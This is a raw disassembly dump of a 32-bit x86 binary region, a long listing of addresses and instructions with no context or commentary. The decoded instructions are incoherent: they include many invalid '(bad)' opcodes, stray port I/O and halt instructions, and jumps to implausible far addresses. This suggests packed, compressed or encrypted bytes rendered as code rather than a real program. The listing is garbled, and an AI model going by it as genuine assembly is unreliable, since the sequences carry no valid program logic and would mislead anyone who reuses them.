  414e89:	sub    DWORD PTR [edi-0x78],edx
  414e8c:	push   es
  414e8d:	rol    bl,cl
  414e8f:	out    dx,al
  414e90:	and    DWORD PTR [ecx-0x5d],0x682e0a07
  414e97:	inc    ecx
  414e98:	shl    BYTE PTR [ecx+0x12],0x24
  414e9c:	xchg   ebx,eax
  414e9d:	stos   DWORD PTR es:[edi],eax
  414e9e:	mov    cl,0xbf
  414ea0:	pushf  
  414ea1:	mov    al,0x30
  414ea3:	rcr    BYTE PTR [ebx-0x33],1
  414ea6:	mov    al,0x2b
  414ea8:	clc    
  414ea9:	gs sahf 
  414eab:	ins    BYTE PTR es:[edi],dx
  414eac:	aaa    
  414ead:	pop    ebx
  414eae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414eaf:	dec    ebx
  414eb0:	xchg   esi,eax
  414eb1:	sar    eax,cl
  414eb3:	push   edi
  414eb4:	or     al,0xc9
  414eb6:	xchg   edi,eax
  414eb7:	fsub   QWORD PTR [ebp-0x3f5270ab]
  414ebd:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  414ebf:	sbb    eax,0x1dc7c805
  414ec4:	push   ebx
  414ec5:	jae    0x414ee1
  414ec7:	jmp    0x3161f1e7
  414ecc:	fcomp  DWORD PTR [ebp+0x2346f707]
  414ed2:	cmp    eax,ebp
  414ed4:	pop    ebx
  414ed5:	(bad)  
  414ed6:	(bad)  
  414ed8:	cmp    edx,DWORD PTR [eax]
  414eda:	test   eax,eax
  414edc:	xor    eax,0xdc75ea44
  414ee1:	push   0x3c8889fd
  414ee6:	push   0xffffffd3
  414ee8:	(bad)  [ecx-0x2a]
  414eeb:	in     al,dx
  414eec:	and    bl,dh
  414eee:	jl     0x414eed
  414ef0:	add    ebp,DWORD PTR [ebp+0x72]
  414ef3:	imul   edx,DWORD PTR [edi],0x18539153
  414ef9:	inc    ebp
  414efa:	dec    ebx
  414efb:	dec    esi
  414efc:	mov    bl,0x9d
  414efe:	fcmovnbe st,st(0)
  414f00:	test   ah,ch
  414f02:	lea    esi,[esi+0x60dd83cb]
  414f08:	nop
  414f09:	fnstsw WORD PTR [ebp+0x632b38ad]
  414f0f:	sbb    al,0x51
  414f11:	adc    eax,0xe9438dbf
  414f16:	ficomp WORD PTR [esi]
  414f18:	arpl   WORD PTR [ecx+0x44],si
  414f1b:	sbb    eax,0x6dbca28a
  414f20:	aad    0xd1
  414f22:	dec    edx
  414f23:	jns    0x414f87
  414f25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f26:	mov    gs,WORD PTR [edx]
  414f28:	mov    esp,0x3d263e3f
  414f2d:	xchg   DWORD PTR [esp+ebx*2-0x1],ebp
  414f31:	mov    al,ds:0x156271cc
  414f36:	rcr    DWORD PTR [edi],cl
  414f38:	retf   
  414f39:	push   edi
  414f3a:	aas    
  414f3b:	adc    al,0x1e
  414f3d:	inc    eax
  414f3e:	out    0xe,al
  414f40:	xchg   BYTE PTR [eax-0x655a5bd2],ch
  414f46:	inc    ecx
  414f47:	push   cs
  414f48:	fdiv   DWORD PTR [eax]
  414f4a:	mov    esi,0x75a1dd00
  414f4f:	loopne 0x414ed2
  414f51:	xchg   DWORD PTR [esi],esp
  414f53:	(bad)  
  414f54:	xchg   edx,eax
  414f55:	mov    ch,0x44
  414f57:	pop    ecx
  414f58:	cdq    
  414f59:	je     0x414fbd
  414f5b:	sub    ebx,DWORD PTR ds:0xe3411af6
  414f61:	outs   dx,DWORD PTR ds:[esi]
  414f62:	test   eax,esp
  414f64:	push   es
  414f65:	cmp    BYTE PTR [ecx+edx*2+0xc],ah
  414f69:	mov    eax,ds:0x24b5838
  414f6e:	stos   DWORD PTR es:[edi],eax
  414f6f:	sbb    esp,edx
  414f71:	ret    
  414f72:	push   ebp
  414f73:	cwde   
  414f74:	retf   0x7519
  414f77:	rcl    bh,cl
  414f79:	mov    bl,0xb5
  414f7b:	push   edx
  414f7c:	and    al,0x8
  414f7e:	cmp    ebx,DWORD PTR [esi]
  414f80:	cmp    BYTE PTR [edx-0x56],bh
  414f83:	das    
  414f84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f85:	popf   
  414f86:	dec    edx
  414f87:	cld    
  414f88:	sub    eax,DWORD PTR [ecx]
  414f8a:	jae    0x414f4f
  414f8c:	fs pop ss
  414f8e:	xchg   ebp,eax
  414f8f:	jbe    0x414f9d
  414f91:	xchg   BYTE PTR [ebx+0x1b],al
  414f94:	pushf  
  414f95:	fs xchg esp,eax
  414f98:	mov    ebx,0xb6698693
  414f9d:	sub    edx,DWORD PTR [edi-0x6580d7e9]
  414fa3:	mov    ah,0xe7
  414fa5:	hlt    
  414fa6:	pop    esi
  414fa7:	int    0xda
  414fa9:	mov    esp,0x4b43f7d6
  414fae:	xor    ah,cl
  414fb0:	add    ebp,DWORD PTR [ebx+0x5d]
  414fb3:	sbb    esp,DWORD PTR [eax]
  414fb5:	cmp    esi,DWORD PTR [eax+eiz*2]
  414fb8:	inc    edi
  414fb9:	cmp    ah,0x19
  414fbc:	repz push esp
  414fbe:	or     DWORD PTR ds:0x1bcf0384,ebx
  414fc4:	sar    DWORD PTR ds:0x1b54da44,1
  414fca:	(bad)  
  414fcb:	sbb    edx,ecx
  414fcd:	sar    WORD PTR [eax-0x67dc0417],cl
  414fd4:	fld    QWORD PTR [ebp-0xe]
  414fd7:	jmp    0xcd15:0x9e1ca25
  414fde:	leave  
  414fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fe0:	cmp    DWORD PTR ds:[ebx+0x1f],ebx
  414fe4:	jnp    0x414f6d
  414fe6:	iret   
  414fe7:	xchg   esp,eax
  414fe8:	outs   dx,BYTE PTR ds:[esi]
  414fe9:	bound  ebx,QWORD PTR [ebp+0x1a023937]
  414fef:	mov    ds:0xd78c1fef,al
  414ff4:	pop    esp
  414ff5:	test   BYTE PTR gs:[eax+0x71],cl
  414ff9:	loope  0x414fea
  414ffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ffc:	or     bl,dl
  414ffe:	(bad)  [edx-0x2f267c]
  415004:	push   esi
  415005:	(bad)  
  415006:	xor    esp,DWORD PTR [ebp-0x1b]
  415009:	mov    ebx,0xef58a219
  41500e:	stos   DWORD PTR es:[edi],eax
  41500f:	pop    ecx
  415010:	mov    WORD PTR [ebx],fs
  415012:	mov    dh,0xab
  415014:	sub    dl,al
  415016:	shl    dh,cl
  415018:	sub    al,0x25
  41501a:	je     0x414ff8
  41501c:	pop    esi
  41501d:	in     eax,dx
  41501e:	retf   0xc9ae
  415021:	mov    DWORD PTR [ebp-0x4aa92e5d],ecx
  415027:	aaa    
  415028:	aaa    
  415029:	sbb    al,0x95
  41502b:	aam    0xc9
  41502d:	mov    dl,cl
  41502f:	mov    cl,0xb0
  415031:	bswap  eax
  415033:	fimul  WORD PTR ds:0xd4248a83
  415039:	push   esp
  41503a:	(bad)  
  41503b:	mov    esp,0xe468ec33
  415040:	adc    al,0x84
  415042:	add    BYTE PTR [ecx+0x70b04dea],dh
  415048:	inc    esp
  415049:	jl     0x415021
  41504b:	daa    
  41504c:	push   ds
  41504d:	push   esi
  41504e:	popa   
  41504f:	outs   dx,BYTE PTR ds:[esi]
  415050:	pop    ecx
  415051:	or     DWORD PTR [esi],edi
  415053:	stc    
  415054:	cdq    
  415055:	ins    DWORD PTR es:[edi],dx
  415056:	xchg   esi,eax
  415057:	xor    al,0x1d
  415059:	cmp    BYTE PTR [ebx+0x64801ad7],bh
  41505f:	data16 mov bl,0xfe
  415062:	sbb    BYTE PTR [ecx],cl
  415064:	es mov eax,0x40a73ead
  41506a:	ins    BYTE PTR es:[edi],dx
  41506b:	out    dx,al
  41506c:	ret    
  41506d:	adc    BYTE PTR [ebx-0x799627e4],cl
  415073:	outs   dx,DWORD PTR ds:[esi]
  415074:	dec    esi
  415075:	fs or  al,0x88
  415078:	stos   DWORD PTR es:[edi],eax
  415079:	mov    ebx,0xbdd5e6ff
  41507e:	mov    dl,BYTE PTR [eax-0x4]
  415081:	and    DWORD PTR [ecx+0x16bace9],ebx
  415087:	jae    0x41501e
  415089:	sbb    ecx,edi
  41508b:	ret    0x6a21
  41508e:	sub    edx,edx
  415090:	cmp    DWORD PTR [edx+ecx*8],edi
  415093:	mov    eax,0x61326ce9
  415098:	xor    al,0xad
  41509a:	dec    ebp
  41509b:	(bad)  
  41509c:	repz cmp DWORD PTR ds:0x395cae26,ebp
  4150a3:	mov    bl,0x4b
  4150a5:	push   ebp
  4150a6:	inc    esi
  4150a7:	sti    
  4150a8:	fcom   DWORD PTR [esi+edi*2]
  4150ab:	add    ebp,esp
  4150ad:	cmp    BYTE PTR [ecx],ah
  4150af:	xor    al,0xff
  4150b1:	cmc    
  4150b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150b3:	cmp    al,BYTE PTR [eax-0x2f984633]
  4150b9:	sar    DWORD PTR [edi],0x77
  4150bc:	jmp    0xffe69802
  4150c1:	lods   eax,DWORD PTR ds:[esi]
  4150c2:	push   ss
  4150c3:	xchg   ebp,eax
  4150c4:	shr    BYTE PTR [ebp-0x4f4cedd5],cl
  4150ca:	lahf   
  4150cb:	push   ebp
  4150cc:	sub    al,0xf5
  4150ce:	imul   DWORD PTR [edi-0x24]
  4150d1:	mov    WORD PTR [edx],ds
  4150d3:	xchg   edi,eax
  4150d4:	in     al,0xe6
  4150d6:	jns    0x4150e6
  4150d8:	repnz push eax
  4150da:	jno    0x4150b5
  4150dc:	ja     0x41506d
  4150de:	out    0x2,al
  4150e0:	cld    
  4150e1:	push   ecx
  4150e2:	sub    DWORD PTR [eax-0x4b890091],esi
  4150e8:	xchg   dl,dl
  4150ea:	retf   0x993
  4150ed:	mov    edx,0x9bb7d95d
  4150f2:	js     0x415147
  4150f4:	addr16 ret 
  4150f6:	outs   dx,BYTE PTR ds:[esi]
  4150f7:	xchg   edx,ebp
  4150f9:	mov    ds:0x30ecd62f,eax
  4150fe:	ins    BYTE PTR es:[edi],dx
  4150ff:	sbb    edi,DWORD PTR [edi-0x79820942]
  415105:	push   cs
  415106:	inc    ecx
  415107:	push   ss
  415108:	push   0x47
  41510a:	or     al,0x51
  41510c:	adc    bl,dh
  41510e:	xchg   ecx,eax
  41510f:	test   eax,0x6e7c3ebe
  415114:	icebp  
  415115:	dec    esi
  415116:	xor    DWORD PTR [ebp+0xb261808],esp
  41511c:	repz icebp 
  41511e:	dec    eax
  41511f:	jle    0x415147
  415121:	clc    
  415122:	cmp    DWORD PTR [edx+0x6e],0x409a0d5
  415129:	and    al,0x1
  41512b:	inc    eax
  41512c:	les    ebx,FWORD PTR [ebp-0x5e8b1b23]
  415132:	int    0x81
  415134:	(bad)  
  415135:	xor    bl,BYTE PTR [esi]
  415137:	test   BYTE PTR [edi+edx*8-0x79],dh
  41513b:	cmp    eax,0x3621580f
  415140:	cmp    ah,BYTE PTR [ebp-0x41]
  415143:	mov    ch,0x57
  415145:	jge    0x41518c
  415147:	sub    esi,edi
  415149:	lds    ecx,FWORD PTR [ebx+0x61]
  41514c:	jo     0x9d8679fb
  415152:	call   0x859cf680
  415157:	mov    dl,0x13
  415159:	loop   0x4151c2
  41515b:	jae    0x415117
  41515d:	jg     0x4151b3
  41515f:	push   0xdb503055
  415164:	int    0x71
  415166:	sbb    DWORD PTR [edx],ecx
  415168:	jae    0x41510b
  41516a:	sub    eax,0x1c12605f
  41516f:	add    eax,0xc70da257
  415174:	push   esp
  415175:	mov    DWORD PTR [edi],0x76633330
  41517b:	inc    esp
  41517c:	ja     0x415157
  41517e:	xchg   ecx,eax
  41517f:	push   esi
  415180:	fs mov edi,0xd1ceacff
  415187:	iret   
  415188:	lds    edi,FWORD PTR [eax+0x58]
  41518b:	clc    
  41518c:	out    0xb7,eax
  41518e:	jle    0x41512f
  415190:	or     BYTE PTR [esi-0x6aa78c2a],dl
  415196:	pop    ecx
  415197:	cmc    
  415198:	popf   
  415199:	sbb    DWORD PTR [ebx+eax*1+0x12dd910b],0xfb02a794
  4151a4:	cmp    BYTE PTR [edx-0x4d9a86b2],ah
  4151aa:	mov    ch,0xba
  4151ac:	sbb    esi,esp
  4151ae:	repz pop edi
  4151b0:	sbb    ecx,DWORD PTR [ecx+ebp*4-0x19764c9f]
  4151b7:	mov    esp,0x52fda2b1
  4151bc:	push   es
  4151bd:	clc    
  4151be:	mov    dl,dl
  4151c0:	test   DWORD PTR [eax+0x4b3bc7c4],esp
  4151c6:	pop    eax
  4151c7:	ret    0xcacb
  4151ca:	xchg   ecx,eax
  4151cb:	lods   al,BYTE PTR ds:[esi]
  4151cc:	inc    esi
  4151cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151ce:	daa    
  4151cf:	pop    eax
  4151d0:	in     eax,dx
  4151d1:	arpl   WORD PTR [esi-0x1844b159],di
  4151d7:	outs   dx,DWORD PTR ds:[esi]
  4151d8:	xor    ch,BYTE PTR [edx+0x76]
  4151db:	gs retf 0x3f4
  4151df:	int3   
  4151e0:	xchg   ebp,eax
  4151e1:	ins    BYTE PTR es:[edi],dx
  4151e2:	enter  0xa364,0x50
  4151e6:	(bad)  
  4151e7:	mov    dh,0x1c
  4151e9:	repnz push ebp
  4151eb:	cli    
  4151ec:	call   0x51c6:0x97f2c7ff
  4151f3:	fwait
  4151f4:	jg     0x41518b
  4151f6:	stos   BYTE PTR es:[edi],al
  4151f7:	cmp    dh,ah
  4151f9:	xor    eax,0x540c8853
  4151fe:	and    DWORD PTR [edi-0x31],eax
  415201:	sub    al,0xb
  415203:	fisub  WORD PTR [edx-0x28f0d2ac]
  415209:	out    dx,al
  41520a:	fsub   st(0),st
  41520c:	mov    bl,0xfb
  41520e:	mov    al,ds:0xa1e63eac
  415213:	das    
  415214:	(bad)  
  415215:	mov    BYTE PTR [ecx-0x3f],cl
  415218:	mov    ah,BYTE PTR [ebx]
  41521a:	push   0xf48100c0
  41521f:	inc    ebp
  415220:	and    al,0x45
  415222:	jg     0x4151da
  415224:	push   ebp
  415225:	je     0x415260
  415227:	mov    ecx,0x10611543
  41522c:	nop
  41522d:	adc    al,0x46
  41522f:	dec    ebp
  415230:	stc    
  415231:	loopne 0x4151d2
  415233:	fs ins DWORD PTR es:[edi],dx
  415235:	jle    0x415292
  415237:	inc    ebx
  415238:	xchg   edx,eax
  415239:	enter  0xc33f,0x40
  41523d:	xor    al,0x6d
  41523f:	out    dx,al
  415240:	adc    al,0xc4
  415242:	adc    DWORD PTR [ebx+0x72],0x31
  415246:	mov    al,ds:0xf43a39da
  41524b:	sbb    ebp,esp
  41524d:	add    BYTE PTR [ecx-0x13f58a72],bh
  415253:	mov    edx,gs
  415255:	cdq    
  415256:	lahf   
  415257:	add    DWORD PTR [ecx],edi
  415259:	int3   
  41525a:	outs   dx,DWORD PTR ds:[esi]
  41525b:	mov    ds:0x6e094ff9,eax
  415260:	xor    ch,BYTE PTR [edx+0xb]
  415263:	jge    0x4152b1
  415265:	mov    edi,ebp
  415267:	pop    ds
  415268:	jg     0x4151ea
  41526a:	and    DWORD PTR [ebp+0x48],ebx
  41526d:	icebp  
  41526e:	sbb    DWORD PTR [ebx+ebx*1-0x38],esi
  415272:	pop    edi
  415273:	fild   DWORD PTR [ecx+0x27d7afd3]
  415279:	or     al,BYTE PTR [edi]
  41527b:	jns    0x4152b5
  41527d:	pop    esi
  41527e:	fisttp WORD PTR [esi+0x1d8da6e5]
  415284:	cmp    eax,0x8cf6cd2b
  415289:	cmp    BYTE PTR [ebx-0x30a08be7],ch
  41528f:	pop    ebx
  415290:	into   
  415291:	jl     0x4152da
  415293:	pop    esp
  415294:	jg     0x415242
  415296:	stos   BYTE PTR es:[edi],al
  415297:	stos   DWORD PTR es:[edi],eax
  415298:	fsubr  QWORD PTR [ebx-0x78]
  41529b:	clc    
  41529c:	adc    eax,0x82067a7e
  4152a1:	push   ebx
  4152a2:	fcomp  DWORD PTR [esi+ebx*1-0x2e]
  4152a6:	fistp  QWORD PTR [eax-0x37]
  4152a9:	pop    es
  4152aa:	aad    0x81
  4152ac:	xchg   esi,eax
  4152ad:	and    al,0xeb
  4152af:	mov    dl,0x93
  4152b1:	dec    esi
  4152b2:	inc    ecx
  4152b3:	loop   0x415322
  4152b5:	popf   
  4152b6:	mov    dh,0x5
  4152b8:	push   ss
  4152b9:	std    
  4152ba:	dec    ebx
  4152bb:	dec    eax
  4152bc:	mov    eax,ds:0x3cf31b1c
  4152c1:	data16 adc dl,dl
  4152c4:	imul   edi,DWORD PTR [edx],0xb5cad470
  4152ca:	data16 adc dl,BYTE PTR [edx]
  4152cd:	outs   dx,DWORD PTR ds:[esi]
  4152ce:	gs add al,0xaf
  4152d1:	imul   esp,DWORD PTR [ebx-0x52c6bc3b],0x11
  4152d8:	or     DWORD PTR [ecx+eax*2],eax
  4152db:	xchg   DWORD PTR [ebx+edi*1-0x46],esi
  4152df:	xor    BYTE PTR [esi-0x75d657e2],bh
  4152e5:	dec    ebx
  4152e6:	outs   dx,BYTE PTR ds:[esi]
  4152e7:	sti    
  4152e8:	or     esi,DWORD PTR [eax+0x3b]
  4152eb:	xchg   esi,eax
  4152ec:	cdq    
  4152ed:	outs   dx,BYTE PTR ds:[esi]
  4152ee:	test   BYTE PTR [ecx+0x59],0x87
  4152f2:	mov    bl,0xb8
  4152f4:	inc    edi
  4152f5:	pop    eax
  4152f6:	hlt    
  4152f7:	xchg   esp,eax
  4152f8:	push   ecx
  4152f9:	dec    edi
  4152fa:	loop   0x415293
  4152fc:	mov    al,0x3d
  4152fe:	pop    ds
  4152ff:	adc    al,0xa1
  415301:	retf   
  415302:	jecxz  0x4152e7
  415304:	xchg   edi,eax
  415305:	mov    ds:0x3599792d,al
  41530a:	add    BYTE PTR [ecx],0x1e
  41530d:	inc    ebx
  41530e:	sbb    ah,ch
  415310:	pop    ds
  415311:	pop    es
  415312:	popf   
  415313:	sbb    eax,0x3bae2a07
  415318:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415319:	cwde   
  41531a:	cld    
  41531b:	aad    0xe8
  41531d:	loop   0x4152ba
  41531f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415320:	jle    0x415343
  415322:	jae    0x41532b
  415324:	sub    edx,DWORD PTR [esi]
  415326:	fnstenv [edx]
  415328:	adc    al,0x6a
  41532a:	les    ecx,FWORD PTR [eax+eax*2+0x4]
  41532e:	cmc    
  41532f:	dec    ebp
  415330:	xor    DWORD PTR ds:[ecx+0x62a659a8],0x4c
  415338:	pop    esi
  415339:	inc    ecx
  41533a:	stos   BYTE PTR es:[edi],al
  41533b:	test   al,0x41
  41533d:	xchg   ebp,eax
  41533e:	or     bl,BYTE PTR [eax+eax*8]
  415341:	in     eax,0x5e
  415343:	push   cs
  415344:	ret    
  415345:	bound  ebp,QWORD PTR [edx]
  415347:	lods   eax,DWORD PTR ds:[esi]
  415348:	or     ebp,DWORD PTR [ecx+eax*1+0x22f9a8db]
  41534f:	leave  
  415350:	js     0x4152d9
  415352:	mov    ebx,0x1d30d743
  415357:	in     al,dx
  415358:	inc    eax
  415359:	dec    edi
  41535a:	xchg   ebx,eax
  41535b:	xchg   edx,eax
  41535c:	pop    ss
  41535d:	into   
  41535e:	or     ebp,DWORD PTR [esi+0x6ba98e4b]
  415364:	inc    ebx
  415365:	inc    edi
  415366:	and    ebp,DWORD PTR fs:[esi+eax*1]
  41536a:	dec    edi
  41536b:	ret    
  41536c:	sahf   
  41536d:	xor    eax,0x135ccd38
  415372:	das    
  415373:	test   DWORD PTR [edx+0x506ab31a],edi
  415379:	adc    DWORD PTR [ecx+0x1327d6d3],0x1d
  415380:	out    0x75,eax
  415382:	push   ds
  415383:	into   
  415384:	mov    ah,0xcd
  415386:	mov    edx,0x333c6434
  41538b:	shl    DWORD PTR [ecx-0x70],1
  41538e:	dec    esp
  41538f:	icebp  
  415390:	xor    esi,eax
  415392:	dec    edx
  415393:	sbb    ecx,DWORD PTR [esi-0x68cd2f23]
  415399:	inc    eax
  41539a:	pop    esi
  41539b:	cld    
  41539c:	pushf  
  41539d:	sub    DWORD PTR [ecx-0x1befd275],edx
  4153a3:	mov    dl,0x15
  4153a5:	out    0x53,eax
  4153a7:	aaa    
  4153a8:	in     eax,0x48
  4153aa:	jo     0x4153c9
  4153ac:	push   ds
  4153ad:	fidiv  DWORD PTR [ebx]
  4153af:	lds    edi,FWORD PTR [eax]
  4153b1:	lds    edi,FWORD PTR [edi-0x22013d3a]
  4153b7:	mov    ebx,0x5b95b966
  4153bc:	dec    edi
  4153bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153be:	xor    DWORD PTR [esi+0x4402b758],ebx
  4153c4:	hlt    
  4153c5:	leave  
  4153c6:	test   BYTE PTR [ebx-0x3b],dh
  4153c9:	mov    ds:0xa6dcdfb9,eax
  4153ce:	rcr    BYTE PTR [esi],cl
  4153d0:	in     eax,0x5e
  4153d2:	stos   BYTE PTR es:[edi],al
  4153d3:	out    dx,al
  4153d4:	pop    eax
  4153d5:	mov    cl,0x9e
  4153d7:	ret    
  4153d8:	xor    al,0x9e
  4153da:	push   esp
  4153db:	and    BYTE PTR [ecx-0x4d2ae97f],bh
  4153e1:	or     eax,0x97098cf
  4153e6:	xor    DWORD PTR [esi+0x27799b6c],esp
  4153ec:	and    BYTE PTR [edx-0x31],dl
  4153ef:	sub    esi,ebp
  4153f1:	mov    esp,0x4b00267c
  4153f6:	xchg   edi,eax
  4153f7:	cmp    BYTE PTR [edi],ch
  4153f9:	cli    
  4153fa:	fs ret 
  4153fc:	xchg   ebp,eax
  4153fd:	cwde   
  4153fe:	push   esp
  4153ff:	inc    eax
  415400:	sub    al,0xfa
  415402:	pop    ebp
  415403:	iret   
  415404:	test   al,0x1f
  415406:	pop    ecx
  415407:	xlat   BYTE PTR ds:[ebx]
  415408:	in     eax,0xee
  41540a:	mov    dh,0x23
  41540c:	pop    esi
  41540d:	mov    esp,0xf4c8e09
  415412:	fs push ebp
  415414:	(bad)  
  415416:	push   0xffffffe5
  415418:	test   BYTE PTR [eax-0x6c],0xa
  41541c:	jp     0x415445
  41541e:	cmp    DWORD PTR [edi+edi*4+0x73],esi
  415422:	mov    ds:0x21c3113d,eax
  415427:	and    DWORD PTR [ebx+0x20],ebx
  41542a:	aad    0x38
  41542c:	jo     0x4153d0
  41542e:	jnp    0x4153b0
  415430:	push   0xffffffcd
  415432:	pop    esp
  415433:	(bad)  
  415434:	adc    eax,0xce5e0fb0
  415439:	or     ebx,DWORD PTR [bp+di+0x27f0]
  41543e:	and    al,0x72
  415440:	xor    dl,ah
  415442:	cmp    ecx,ebp
  415444:	add    eax,DWORD PTR [eax+0x5b4efcde]
  41544a:	cmp    eax,0x2651349c
  41544f:	and    dh,BYTE PTR [esi+0x4ce5326a]
  415455:	repz in eax,0x88
  415458:	lea    ecx,[ecx-0x5e585121]
  41545e:	inc    ebp
  41545f:	(bad)  
  415460:	int    0x44
  415462:	push   ebx
  415463:	popa   
  415464:	push   edi
  415465:	dec    esp
  415466:	in     eax,dx
  415467:	add    al,0x1e
  415469:	push   eax
  41546a:	enter  0xd8bc,0xc5
  41546e:	sbb    eax,0x68ab6e75
  415473:	retf   
  415474:	xchg   edx,eax
  415475:	mov    esi,0x4a5cdd2c
  41547a:	adc    ebx,DWORD PTR [ecx-0x3c]
  41547d:	aaa    
  41547e:	in     al,dx
  41547f:	outs   dx,BYTE PTR ds:[esi]
  415480:	push   edx
  415481:	jne    0x415413
  415483:	ds mov ch,0x24
  415486:	retf   0x13e6
  415489:	add    BYTE PTR [edx],bl
  41548b:	test   ecx,ecx
  41548d:	mov    cl,0x45
  41548f:	sub    al,0xf4
  415491:	dec    esi
  415492:	mov    cl,bl
  415494:	adc    al,BYTE PTR ds:0x5f6835a3
  41549a:	sub    BYTE PTR [esi+0x4c37d8c1],al
  4154a0:	sar    DWORD PTR [esi-0x1633cdd7],cl
  4154a6:	sbb    esi,DWORD PTR [ecx+0x1b]
  4154a9:	lock cld 
  4154ab:	nop
  4154ac:	(bad)  
  4154ad:	and    ebx,DWORD PTR [eax-0x2f2d3c37]
  4154b3:	dec    ecx
  4154b4:	cli    
  4154b5:	jecxz  0x415481
  4154b7:	pusha  
  4154b8:	rcr    esp,cl
  4154ba:	xlat   BYTE PTR ds:[ebx]
  4154bb:	mov    ds:0x6b98a551,eax
  4154c0:	jmp    0x415504
  4154c2:	adc    DWORD PTR [edx+eax*4-0x2bd99a9e],esi
  4154c9:	(bad)  
  4154ca:	xlat   BYTE PTR ds:[ebx]
  4154cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154cc:	daa    
  4154cd:	mov    ah,0x90
  4154cf:	jl     0x41552f
  4154d1:	imul   esi,eax,0xc3e6c0bd
  4154d7:	dec    ebp
  4154d8:	mov    ecx,0x3b642272
  4154dd:	pop    edi
  4154de:	adc    al,0xc2
  4154e0:	out    dx,al
  4154e1:	mov    al,0x3c
  4154e3:	mov    dh,0x17
  4154e5:	xchg   ecx,eax
  4154e6:	scas   eax,DWORD PTR es:[edi]
  4154e7:	out    dx,eax
  4154e8:	inc    edi
  4154e9:	push   edi
  4154ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154eb:	fwait
  4154ec:	sar    DWORD PTR [ebx+edi*1],1
  4154ef:	dec    edx
  4154f0:	or     DWORD PTR [ebx],eax
  4154f2:	xor    DWORD PTR [edx-0x42],ebx
  4154f5:	jl     0x41548e
  4154f7:	mov    edi,0x647675b9
  4154fc:	popf   
  4154fd:	xchg   ebp,eax
  4154fe:	imul   DWORD PTR [esi]
  415500:	push   esp
  415501:	(bad)  
  415502:	jge    0x415528
  415504:	lods   al,BYTE PTR ds:[esi]
  415505:	sub    al,0xf2
  415507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415508:	pop    ebx
  415509:	push   esi
  41550a:	leave  
  41550b:	out    dx,eax
  41550c:	lock aaa 
  41550e:	aas    
  41550f:	stos   BYTE PTR es:[edi],al
  415510:	adc    bl,BYTE PTR [esp+ecx*1]
  415513:	adc    ecx,DWORD PTR [eax]
  415515:	cmp    eax,DWORD PTR [esi-0x8b4fc5c]
  41551b:	and    al,0xc5
  41551d:	sbb    al,0xe8
  41551f:	pop    esp
  415520:	mov    DWORD PTR [edx],edx
  415522:	pop    esi
  415523:	sahf   
  415524:	xchg   ecx,eax
  415525:	jne    0x41555b
  415527:	or     ebp,DWORD PTR [ebx+0x756fadc5]
  41552d:	xor    bh,bh
  41552f:	fcmovne st,st(5)
  415531:	mov    ch,0xe7
  415533:	cmp    edi,esp
  415535:	mov    BYTE PTR [edx-0x6d],dl
  415538:	or     DWORD PTR [ebx],edi
  41553a:	pop    ds
  41553b:	jbe    0x4155a0
  41553d:	shr    edi,cl
  41553f:	cwde   
  415540:	(bad)
  415544:	xchg   ebx,eax
  415545:	fs jg  0x41555f
  415548:	shl    BYTE PTR [ecx],cl
  41554a:	cmp    esp,DWORD PTR [edx-0x1931907a]
  415550:	ins    BYTE PTR es:[edi],dx
  415551:	xchg   BYTE PTR [ecx],ch
  415553:	cmp    ecx,ecx
  415555:	pop    ebp
  415556:	shr    DWORD PTR ds:0x37f734cd,1
  41555c:	push   esp
  41555d:	and    al,0x30
  41555f:	in     eax,dx
  415560:	call   DWORD PTR [edi+0x7a756846]
  415566:	mov    bh,BYTE PTR [edx]
  415568:	adc    esp,ecx
  41556a:	push   eax
  41556b:	cmp    BYTE PTR [eax-0x47],bh
  41556e:	out    dx,al
  41556f:	icebp  
  415570:	add    DWORD PTR [ecx-0x60],edx
  415573:	iret   
  415574:	jge    0x41557a
  415576:	jbe    0x4155f1
  415578:	inc    ecx
  415579:	pusha  
  41557a:	out    dx,eax
  41557b:	and    ebp,DWORD PTR [bp+0x6e55]
  415580:	push   ebp
  415581:	hlt    
  415582:	sahf   
  415583:	and    al,0x57
  415585:	call   0xf1b9:0xba04b8a2
  41558c:	xchg   esi,eax
  41558d:	inc    esi
  41558e:	xchg   ebp,eax
  41558f:	aas    
  415590:	enter  0xf85b,0xef
  415594:	popf   
  415595:	imul   edx,edi,0xffffff8a
  415598:	and    ah,BYTE PTR [esi-0x23]
  41559b:	ss (bad) 
  41559e:	jmp    0xb928:0x16a28518
  4155a5:	mov    edi,0x1d04f9e3
  4155aa:	inc    edi
  4155ab:	adc    al,0x17
  4155ad:	test   DWORD PTR [ecx-0x3bdf76e1],0x7d76ad45
  4155b7:	jp     0x415620
  4155b9:	cli    
  4155ba:	cli    
  4155bb:	xchg   edi,eax
  4155bc:	or     eax,0x8c04461a
  4155c1:	jge    0x41558b
  4155c3:	jmp    0x9a570162
  4155c8:	out    dx,eax
  4155c9:	fistp  QWORD PTR [edx+eax*2-0x8]
  4155cd:	xor    DWORD PTR [ebx],esi
  4155cf:	push   eax
  4155d0:	pop    ss
  4155d1:	loope  0x4155fc
  4155d3:	jb     0x4155b5
  4155d5:	dec    eax
  4155d6:	adc    DWORD PTR [edi+0x22],0xffffff98
  4155da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155db:	sbb    bh,cl
  4155dd:	mov    ds:0x5e1b7ea0,eax
  4155e2:	jmp    0x4155ef
  4155e4:	mov    ecx,0xc5f006bf
  4155e9:	xchg   esi,eax
  4155ea:	push   esp
  4155eb:	arpl   WORD PTR [ecx+0x55e7d794],cx
  4155f1:	sbb    bl,BYTE PTR [ebx+ebp*4-0x65be9919]
  4155f8:	(bad)  
  4155f9:	mov    cl,0x87
  4155fb:	dec    esi
  4155fc:	push   esi
  4155fd:	mov    ebx,0xb1f1723a
  415602:	out    dx,al
